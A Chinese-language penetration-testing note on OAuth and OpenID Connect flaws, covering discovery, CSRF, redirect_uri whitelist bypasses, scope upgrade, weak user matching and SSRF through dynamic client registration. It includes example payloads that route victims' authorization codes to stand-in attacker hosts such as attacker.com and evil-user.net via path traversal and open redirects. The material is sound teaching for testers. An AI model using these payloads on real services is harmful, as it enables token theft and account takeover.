---
title: OAuth 测试思路
date: 2026-10-22
updated: 2026-10-22
tags:
  - OAuth
description: OAuth 测试思路
---
## 发现

- 授权请求报文
- 第三方授权

这些都是使用 OAuth 的信号。

而且你还可以主动尝试访问下述端点：

```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

如果存在，则是使用了 OAuth 的信号。

针对 OpenID Connect 框架，部分可能存在“**支持但并未使用**”的情况，这点可通过在授权请求中添加：

```http
scope: openid
response_type=id_token
```

通过观察响应是否出现错误来判断支持情况。

## 侦察

在 OAuth 场景中，你往往能通过 Icon、页面上的提示（微信登入、Googgle 账户登入等）以及域名获得 OAuth 提供商的信息。

OAuth 提供商往往会提供有关 OAuth 实现的详细文档，阅读该文档对后续测试 OAuth 有着极大的帮助。

此外，一旦确认授权服务器的主机名之后，应尝试请求下述端点：

```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

这些端点通常会返回一个 JSON 格式的配置文件，里面也许会提供官方文档未提供的信息。

## 洞察

客户端通常会使用信誉良好、经过实战检验且能有效防御广为人知攻击的 OAuth 服务，如微信、Google 等等，但是它们自身对 OAuth 的实现通常没那么到位。

因为 OAuth 并不内置安全功能，其安全性往往取决于实现者。然而步骤、参数多的特点使得实现过程中很容易出现失误。

## 身份未绑定

针对：隐式授权

问题描述：客户端申请到的访问令牌并没有与资源所有者绑定，即授资源服务器仅判断访问令牌是否有效。

导致：攻击者可以通过自己的访问令牌向资源服务器申请别人的信息。

## 一半一半

通过 CSRF，攻击者可以将一个完整的 OAuth 流程拆分成两半，分两个情况：

- 前半部分由攻击者完成，后半部分由受害者完成 → 将攻击者信息绑定到受害者账户
- 前半部分由受害者完成，后半部分由攻击者完成 → 将受害者信息绑定到攻击者账户

`state` 参数会起到一定的防护作用，但是并不能根治 CSRF。比如在“前攻后受”的场景中，`state` 的值攻击者是完全知晓的。

## 有缺陷的 `redirect_uri`

根据 [RFC 规范](https://www.rfc-editor.org/info/rfc6749/#section-3.1.2.2)，客户端需要向授权服务器注册 `redirect_uri` 白名单。

但规范毕竟只是规范，因此大可尝试将 `redirect_uri` 替换成自己的域名。在授权码授权类型中，配合 CSRF，该操作可将受害者的授权码发送到你的服务器，随后你可以让客户端完成后续的 OAuth 步骤。

而且，即便客户端向授权服务器注册了白名单，也可能出现下述几种情况：

| 可能的情况                | 处理方法                                                                                                               |
| -------------------- | ------------------------------------------------------------------------------------------------------------------ |
| 仅检查是否包含或者以 xxx 开头/结尾 | 尝试对合法 URL 进行修改（删除、添加查询参数、添加路径……），查看是否有不报错的情况。                                                                      |
| 可向 URL 添加额外的值        | 利用不同组件间的解析差异，比如：`https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`。                                |
| 冗余 `redirect_uri`    | 出现冗余参数的时候，服务器会进行对应的处理（取前者、取后者、合并成数组……）。如果服务器和白名单逻辑最终处理的参数值不一致，则白名单的限制就失效了。                                         |
| `localhost` 的特殊处理    | `localhost` 经常在开发环境中被使用。在某些情况中，对 `localhost` 开头的 `redirect_uri` 都会被允许，这使得攻击者可以构造类似 `localhost.evil.com` 这样的域名实现绕过。 |
| 目录穿越                 | `redirect_uri` 不总是能绕过白名单限制，但是可以在当前白名单 URI 的基础上尝试目录穿越。该场景通常需要和其他漏洞配合，比如开放重定向，详见[[#通过代理页面窃取授权码和访问令牌|下一小节]]。                                       |

**注意**，不要孤立地看 `redirect_uri` 参数，还要关注参数与参数之间的关系。比如当 `response_mode` 被设置为 `web_message` 的时候，代表 User-Agent（比如浏览器）上使用了辅助窗口来完成 OAuth 流程（想必大家都见过，当选择“使用 Google 账号完成登入”的时候，有时会弹出一个辅助窗口，OAuth 流程都在这个窗口中完成），在该情况中，为了方便跨窗口传递授权码等信息，授权服务器会访问 User-Agent 的 postMessage API 来实现信息传递，这可能需要在白名单中注册更多的信息，从而提供更多的可能。

## 通过代理页面窃取授权码和访问令牌

对于 `redirect_uri`，你不总是能绕过白名单的限制，但是可以在当前白名单 URI 的基础上尝试路径遍历：

```
https://client-app.com/oauth/callback/../../example/path
```

后端如果正确处理了点段，则重定向端点则变成了：

```
https://client-app.com/example/path
```

一旦你发现了这个现象，那么你就需要对能访问的页面进行审计，尝试发现一些能窃取授权码或者访问令牌的方法。

>[!note]
> 这些能被利用于窃取访问令牌或授权码的页面就是标题所说的“代理页面”。

该情景中，最有效的方法之一就是开放重定向，利用路径遍历将回调端点设置成存在开放重定向的端点并将重定向的地址指向攻击者的恶意服务器：

```
redirect_uri=https://client-app.com/oauth/callback/../../open?path=https://attacker.com
```

重定向到回调端点时，无论是授权码还是访问令牌都会拼接在恶意服务器的 URI 上：

```
https://client-app.com/oauth/callback/../../open?path=https://attacker.com?code=abcd……
```

触发开放重定向，访问：

```
https://attacker.com?code=abcd……
```

除开放重定向之外，还有两个常见的方法：

| 方法              | 描述                                                                                                                                       |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| XSS             | 针对 XSS 的限制往往是防止其窃取 Cookie，但是针对访问令牌或者授权码的窃取却很少限制。                                                                                         |
| 参数、URL 片段的不安全传递 | 网站有些时候会在端点与端点之间传递参数或者 URL 片段，这种传递行为可能会协助攻击者获得授权码或者访问令牌。                                                                                  |
| HTTP 注入         | 有些时候你无法注入 JS 代码但是可以注入 HTML，部分对外请求，在 HTTP Header 中可能会暴露授权码或者访问令牌的信息。比如 `<img src="evil-user.net">`，在 `Referer` 头中可能会暴露当前的 URL（其中可能含授权令牌）。 |

## 有缺陷的 `scope` 验证

客户端能从资源服务器获取到的信息会受到 `scope` 的制约，但是这在某些场景中会被打破。

### 恶意客户端

假设攻击者成功向授权服务器注册了一个客户端。理论上说，在授权请求中恶意客户端就可以放宽 `scope`，但是资源所有者（受害者）在授权服务器上完成授权的时候会看到授权范围，这也许会让受害者怀疑从而拒绝授权。

因此，常见的做法是，在授权请求中使用正常的 `scope`，但是在后续“用授权码换令牌”的过程中，放宽 `scope` 的范围，如果授权服务器并没有绑定范围信息则可能让恶意客户端拿到权限更大的访问令牌。

### 有缺陷的隐式授权

在隐式授权中，如果攻击者获取了用户的访问令牌，则攻击者可以主动向资源服务器发起访问并携带更宽的 `scope`。

## 未充分验证的用户

客户端可能将从资源服务器上获取的部分用户信息来进行账号选择/注册。

比如客户端从资源服务器上获得了资源所有者的用户名和邮箱，就据此在数据库找有没有对应的账号，有的话就直接登入，没有的话就为其完成注册。

如果：

- 客户端仅依据一些可重复信息，或者
- 资源服务器上可不经验证地注册重复信息

则攻击者可以在资源服务器上注册与受害者相同的信息（只需要那些客户端依赖的信息项相同），客户端可能无法正确分辨攻击者和受害者，从而让攻击者登入受害者账户。

## OpenID Connect 漏洞

### 动态客户端注册

OpenID 提供了一种客户端向 OAuth 提供商注册的方式，称为“动态客户端注册”。

客户端会向指定端点（通常根据 [[#Recon]] 得到）发起类似这样的请求：

```http
POST /register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: server.example.com

{
 "redirect_uris": [
   "https://client.example.org/callback",
   "https://client.example.org/callback2"],
 "client_name": "My Example Client",
 "client_name#ja-Jpan-JP":
    "\u30AF\u30E9\u30A4\u30A2\u30F3\u30C8\u540D",
 "token_endpoint_auth_method": "client_secret_basic",
 "logo_uri": "https://client.example.org/logo.png",
 "jwks_uri": "https://client.example.org/my_public_keys.jwks",
 "example_extension_parameter": "example_value"
}
```

>[!info]
> 注册元信息列表，可以参照 [Client Metadata](https://datatracker.ietf.org/doc/html/rfc7591#section-2)。

在响应中，一般能看到注册的详细内容：

```http
HTTP/2 201 Created
Content-Type: application/json; charset=utf-8
Content-Length: xxx

{
  "application_type": "web",
  "grant_types": [
    "authorization_code"
  ],
  "id_token_signed_response_alg": "RS256",
  "post_logout_redirect_uris": [],
  "require_auth_time": false,
  "response_types": [
    "code"
  ],
  "subject_type": "public",
  "token_endpoint_auth_method": "client_secret_basic",
  "introspection_endpoint_auth_method": "client_secret_basic",
  "revocation_endpoint_auth_method": "client_secret_basic",
  "require_signed_request_object": false,
  "request_uris": [],
  "client_id_issued_at": 1794016723,
  "client_id": "Je8lk95nEW7jBoKXvG_pj",
  "client_secret_expires_at": 0,
  "client_secret": "-OjNANNTFGpJA1Qx9J8SksS70cO1SK7S9BXAWhSTy9uFHfcgRnQGFefJ2uy2grNT6wojyO0yPW9qBhFFO_QCYw",
  "redirect_uris": [
    "http://example.com"
  ],
  "registration_client_uri": "https://oauth-0a9400390465f43f8036014f02a0003b.oauth-server.net/reg/Je8lk95nEW7jBoKXvG_pj",
  "registration_access_token": "gnxnDq7fqm8s_ZWqi0w8Svw_8lIVO-I1ndSHIspfl9d"
}
```

这些注册的信息，在后续 OAuth 的相关流程中可能被授权服务器所使用。比如 `logo_uri`，授权服务器可能会在某位置请求并展示客户端的 Logo 信息，这可能导致 SSRF（因为请求发起者是授权服务器）。

### 授权请求的其他提交方式

在 OpenID Connect 中，授权请求所需要提交的参数可以通过 `request_uri` 指定一个 URI 来实现（参照[规范](https://openid.net/specs/openid-connect-core-1_0.html#RequestUriParameter)）。

该 URI 会向资源服务器提供一个 JWT 格式的声明集（当然，大多数情况为 JWS/JWE 的形式）。

对于常规授权请求，服务器可能进行了严格的防御，但是针对如上这样的非常规情况，服务器可能单纯依赖 JWS/JWE 所提供的密码学保证，但这并非一定安全（这并非本分类的讨论重点，详见 JWT 分类）。